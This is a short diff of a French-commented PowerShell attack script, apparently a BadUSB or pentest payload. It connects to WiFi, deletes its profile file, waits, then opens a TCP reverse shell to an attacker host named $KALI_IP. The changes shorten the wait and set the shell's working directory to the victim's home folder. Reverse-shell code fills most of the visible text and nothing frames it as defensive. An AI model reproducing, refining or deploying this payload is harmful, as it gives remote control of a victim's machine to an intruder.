@@ -41,13 +41,15 @@ netsh wlan connect name="$SSID" > $null 2>&1
 Remove-Item $profilePath -Force -ErrorAction SilentlyContinue
 
 # Attente pour laisser le temps pour le revshell
-Start-Sleep -Seconds 15
+Start-Sleep -Seconds 8
 
 # Reverse shell
 try {
     $client = New-Object System.Net.Sockets.TCPClient($KALI_IP, $KALI_PORT);
     $stream = $client.GetStream();
     [byte[]]$bytes = 0..65535 | %{0};
+
+    Set-Location $env:USERPROFILE  # <- Positionne la session dans le home
 
     $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(500, 1000)
 
@@ -61,3 +63,4 @@ try {
     }
     $client.Close()
 } catch {}
+
